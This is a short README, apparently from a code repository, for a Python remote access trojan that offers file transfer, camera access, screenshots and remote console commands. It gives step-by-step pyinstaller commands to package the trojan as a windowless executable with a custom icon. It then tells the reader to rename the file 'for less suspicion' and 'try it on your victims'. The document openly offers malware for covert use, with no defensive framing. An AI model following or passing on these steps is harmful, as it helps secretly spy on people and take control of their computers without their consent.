# remote-access-trojan
Simple trojan that has such functions like file transfering, camera access, screenshoting, it aslo supports console commands
How to use:
1. Open terminal in folder with remote-access-trojan files
2. If you don't have pyinstaller, install it by running command 'pip install pyinstaller'
3. Next step, run 'pyinstaller --noconsole --onefile server.py'
4. After process completion you can find RAT in dist folder
5. You can also set icon for your RAT by running something like 'pyinstaller --noconsole --onefile --icon=app.ico server.py'
6. Rename .exe file for less suspicion and try it on your victims
